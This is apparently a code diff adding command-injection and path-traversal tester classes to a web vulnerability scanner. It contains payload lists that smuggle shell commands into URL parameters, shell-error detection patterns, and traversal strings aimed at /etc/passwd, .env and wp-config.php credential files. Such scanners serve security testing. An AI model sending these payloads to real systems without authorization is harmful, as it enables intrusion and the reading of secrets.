@@ -581,3 +581,348 @@ class SSTITester:
         params[param] = [payload]
         new_query = urlencode({k: v[0] for k, v in params.items()})
         return parsed._replace(query=new_query).geturl()
+
+
+# ═════════════════════════════════════════════════════════════════════════════
+# Command Injection Tester
+# ═════════════════════════════════════════════════════════════════════════════
+
+class CommandInjectionTester:
+    """
+    Tests for OS Command Injection vulnerabilities.
+
+    Detection strategies:
+    1. Canary echo — inject '; echo aegis_cmdi_test' and look for output
+    2. Time-based — inject '; sleep 5' and measure response delay
+    3. Error-based — inject metacharacters and look for shell errors
+    """
+
+    # Canary payloads: if the canary string appears in response → confirmed
+    CANARY = "aegis_cmdi_test"
+    CANARY_PAYLOADS = [
+        f"; echo {CANARY}",
+        f"| echo {CANARY}",
+        f"|| echo {CANARY}",
+        f"&& echo {CANARY}",
+        f"`echo {CANARY}`",
+        f"$(echo {CANARY})",
+        f"; echo {CANARY} ;",
+        f"| echo {CANARY} |",
+    ]
+
+    # Time-based payloads
+    TIME_PAYLOADS = [
+        "; sleep 5",
+        "| sleep 5",
+        "|| sleep 5 ||",
+        "&& sleep 5 &&",
+        "`sleep 5`",
+        "$(sleep 5)",
+    ]
+
+    # Error trigger payloads
+    ERROR_PAYLOADS = [";", "|", "||", "&&", "`", "$()"]
+
+    SHELL_ERROR_PATTERNS = [
+        re.compile(r"sh:\s*\d+:\s*Syntax error", re.I),
+        re.compile(r"bash:\s*-c:\s*line", re.I),
+        re.compile(r"cannot execute binary file", re.I),
+        re.compile(r"/bin/sh:", re.I),
+        re.compile(r"command not found", re.I),
+        re.compile(r"syntax error near unexpected token", re.I),
+        re.compile(r"No such file or directory", re.I),
+        re.compile(r"Permission denied", re.I),
+    ]
+
+    async def test(
+        self, url: str, parameter: str, engine: RequestEngine
+    ) -> List[TestResult]:
+        """Test for command injection vulnerabilities."""
+        results = []
+        baseline = await engine.get_baseline(url)
+
+        # ── Strategy 1: Canary echo ──────────────────────────────────────
+        for payload in self.CANARY_PAYLOADS:
+            test_url = self._inject_param(url, parameter, payload)
+            response = await engine.get(test_url)
+            if response.error:
+                continue
+
+            analysis = _analyse_response_diff(baseline, response, payload)
+
+            if self.CANARY in response.body:
+                confidence = _build_confidence(
+                    payload_reflected=True,
+                    status_changed=analysis.status_code_changed,
+                    exploit_confirmed=True,
+                    headers_changed=analysis.header_changed,
+                )
+                req_ev, resp_ev = _build_evidence_strings(
+                    url, "GET", parameter, payload, response
+                )
+                results.append(TestResult(
+                    url=url,
+                    vuln_type="command_injection",
+                    payload=payload,
+                    parameter=parameter,
+                    http_method="GET",
+                    baseline_response=baseline,
+                    test_response=response,
+                    is_vulnerable=True,
+                    confidence=confidence,
+                    evidence=f"Command output reflected: canary '{self.CANARY}' found in response",
+                    verified=True,
+                    response_analysis=analysis,
+                    request_evidence=req_ev,
+                    response_evidence=resp_ev,
+                ))
+                return results  # confirmed — no need to test more
+
+        # ── Strategy 2: Time-based blind ─────────────────────────────────
+        if baseline and not baseline.error:
+            baseline_time = baseline.response_time_ms
+            for payload in self.TIME_PAYLOADS:
+                test_url = self._inject_param(url, parameter, payload)
+                response = await engine.get(test_url)
+                if response.error:
+                    continue
+
+                analysis = _analyse_response_diff(baseline, response, payload)
+                time_delta = response.response_time_ms - baseline_time
+
+                if time_delta > 4000:  # > 4s delay (expected ~5s)
+                    confidence = _build_confidence(
+                        payload_reflected=False,
+                        status_changed=analysis.status_code_changed,
+                        exploit_confirmed=True,
+                        headers_changed=analysis.header_changed,
+                    )
+                    req_ev, resp_ev = _build_evidence_strings(
+                        url, "GET", parameter, payload, response
+                    )
+                    results.append(TestResult(
+                        url=url,
+                        vuln_type="command_injection",
+                        payload=payload,
+                        parameter=parameter,
+                        http_method="GET",
+                        baseline_response=baseline,
+                        test_response=response,
+                        is_vulnerable=True,
+                        confidence=max(confidence, 0.75),
+                        evidence=(
+                            f"Time-based command injection: "
+                            f"baseline={baseline_time:.0f}ms → "
+                            f"payload={response.response_time_ms:.0f}ms "
+                            f"(Δ{time_delta:.0f}ms)"
+                        ),
+                        verified=True,
+                        response_analysis=analysis,
+                        request_evidence=req_ev,
+                        response_evidence=resp_ev,
+                    ))
+                    return results
+
+        # ── Strategy 3: Error-based ──────────────────────────────────────
+        for payload in self.ERROR_PAYLOADS:
+            test_url = self._inject_param(url, parameter, payload)
+            response = await engine.get(test_url)
+            if response.error:
+                continue
+
+            analysis = _analyse_response_diff(baseline, response, payload)
+            for pattern in self.SHELL_ERROR_PATTERNS:
+                if pattern.search(response.body):
+                    confidence = _build_confidence(
+                        payload_reflected=False,
+                        status_changed=analysis.status_code_changed,
+                        exploit_confirmed=False,
+                        headers_changed=analysis.header_changed,
+                    )
+                    req_ev, resp_ev = _build_evidence_strings(
+                        url, "GET", parameter, payload, response
+                    )
+                    results.append(TestResult(
+                        url=url,
+                        vuln_type="command_injection",
+                        payload=payload,
+                        parameter=parameter,
+                        http_method="GET",
+                        baseline_response=baseline,
+                        test_response=response,
+                        is_vulnerable=True,
+                        confidence=max(confidence, 0.60),
+                        evidence=f"Shell error pattern detected: {pattern.pattern}",
+                        verified=False,
+                        response_analysis=analysis,
+                        request_evidence=req_ev,
+                        response_evidence=resp_ev,
+                    ))
+                    return results
+
+        return results
+
+    def _inject_param(self, url: str, param: str, payload: str) -> str:
+        parsed = urlparse(url)
+        params = parse_qs(parsed.query)
+        params[param] = [payload]
+        new_query = urlencode({k: v[0] for k, v in params.items()})
+        return parsed._replace(query=new_query).geturl()
+
+
+# ═════════════════════════════════════════════════════════════════════════════
+# Path Traversal / Local File Inclusion Tester
+# ═════════════════════════════════════════════════════════════════════════════
+
+class PathTraversalTester:
+    """
+    Tests for Path Traversal / Local File Inclusion (LFI) vulnerabilities.
+
+    Detection strategies:
+    1. Known file content — traverse to /etc/passwd, check for 'root:'
+    2. Application file — traverse to known files like .env, config
+    3. Null byte bypass — add %00 to bypass extension checks
+    4. Encoding variants — double encoding, unicode dots
+    """
+
+    # Target files and their expected content
+    TARGET_FILES = [
+        ("../../../etc/passwd", "root:"),
+        ("../../../../etc/passwd", "root:"),
+        ("../../../../../etc/passwd", "root:"),
+        ("../../../../../../etc/passwd", "root:"),
+        ("..\\..\\..\\windows\\win.ini", "[fonts]"),
+        ("..\\..\\..\\..\\windows\\win.ini", "[fonts]"),
+    ]
+
+    # Encoding bypass variants
+    ENCODING_VARIANTS = [
+        ("..%2f..%2f..%2fetc/passwd", "root:"),
+        ("..%252f..%252f..%252fetc/passwd", "root:"),
+        ("..%c0%af..%c0%af..%c0%afetc/passwd", "root:"),
+        ("....//....//....//etc/passwd", "root:"),
+        ("..%00/..%00/..%00/etc/passwd", "root:"),
+    ]
+
+    # Null byte bypass
+    NULL_BYTE_VARIANTS = [
+        ("../../../etc/passwd%00", "root:"),
+        ("../../../etc/passwd%00.html", "root:"),
+        ("../../../etc/passwd%00.jpg", "root:"),
+    ]
+
+    # Application config traversal
+    APP_CONFIG_TARGETS = [
+        ("../.env", ["DB_PASSWORD", "SECRET_KEY", "API_KEY", "DATABASE_URL"]),
+        ("../../.env", ["DB_PASSWORD", "SECRET_KEY", "API_KEY", "DATABASE_URL"]),
+        ("../../../.env", ["DB_PASSWORD", "SECRET_KEY", "API_KEY", "DATABASE_URL"]),
+        ("../../../wp-config.php", ["DB_NAME", "DB_USER", "DB_PASSWORD"]),
+        ("../../../config/database.yml", ["adapter:", "database:", "username:"]),
+    ]
+
+    async def test(
+        self, url: str, parameter: str, engine: RequestEngine
+    ) -> List[TestResult]:
+        """Test for path traversal vulnerabilities."""
+        results = []
+        baseline = await engine.get_baseline(url)
+
+        # ── Strategy 1: Known system files ───────────────────────────────
+        all_targets = self.TARGET_FILES + self.ENCODING_VARIANTS + self.NULL_BYTE_VARIANTS
+        for payload, expected in all_targets:
+            test_url = self._inject_param(url, parameter, payload)
+            response = await engine.get(test_url)
+            if response.error:
+                continue
+
+            analysis = _analyse_response_diff(baseline, response, payload)
+
+            if expected in response.body:
+                # Verify it's not just the word appearing normally
+                # /etc/passwd should have "root:x:0:0" pattern
+                is_genuine = self._verify_file_content(expected, response.body)
+                if is_genuine:
+                    confidence = _build_confidence(
+                        payload_reflected=False,
+                        status_changed=analysis.status_code_changed,
+                        exploit_confirmed=True,
+                        headers_changed=analysis.header_changed,
+                    )
+                    req_ev, resp_ev = _build_evidence_strings(
+                        url, "GET", parameter, payload, response
+                    )
+                    results.append(TestResult(
+                        url=url,
+                        vuln_type="path_traversal",
+                        payload=payload,
+                        parameter=parameter,
+                        http_method="GET",
+                        baseline_response=baseline,
+                        test_response=response,
+                        is_vulnerable=True,
+                        confidence=confidence,
+                        evidence=f"File content confirmed: '{expected}' found via {payload}",
+                        verified=True,
+                        response_analysis=analysis,
+                        request_evidence=req_ev,
+                        response_evidence=resp_ev,
+                    ))
+                    return results  # confirmed
+
+        # ── Strategy 2: Application config files ─────────────────────────
+        for payload, markers in self.APP_CONFIG_TARGETS:
+            test_url = self._inject_param(url, parameter, payload)
+            response = await engine.get(test_url)
+            if response.error:
+                continue
+
+            analysis = _analyse_response_diff(baseline, response, payload)
+            matched = [m for m in markers if m in response.body]
+
+            if len(matched) >= 2:  # at least 2 config markers
+                confidence = _build_confidence(
+                    payload_reflected=False,
+                    status_changed=analysis.status_code_changed,
+                    exploit_confirmed=True,
+                    headers_changed=analysis.header_changed,
+                )
+                req_ev, resp_ev = _build_evidence_strings(
+                    url, "GET", parameter, payload, response
+                )
+                results.append(TestResult(
+                    url=url,
+                    vuln_type="path_traversal",
+                    payload=payload,
+                    parameter=parameter,
+                    http_method="GET",
+                    baseline_response=baseline,
+                    test_response=response,
+                    is_vulnerable=True,
+                    confidence=confidence,
+                    evidence=f"Config file leaked via {payload} — markers: {matched}",
+                    verified=True,
+                    response_analysis=analysis,
+                    request_evidence=req_ev,
+                    response_evidence=resp_ev,
+                ))
+                return results
+
+        return results
+
+    @staticmethod
+    def _verify_file_content(expected: str, body: str) -> bool:
+        """Verify the file content is genuine, not a false match."""
+        if expected == "root:":
+            # /etc/passwd has specific format: root:x:0:0:...
+            return bool(re.search(r"root:[x*]:0:0:", body))
+        if expected == "[fonts]":
+            # win.ini has [fonts] section
+            return "[fonts]" in body and "[extensions]" in body.lower()
+        return True
+
+    def _inject_param(self, url: str, param: str, payload: str) -> str:
+        parsed = urlparse(url)
+        params = parse_qs(parsed.query)
+        params[param] = [payload]
+        new_query = urlencode({k: v[0] for k, v in params.items()})
+        return parsed._replace(query=new_query).geturl()
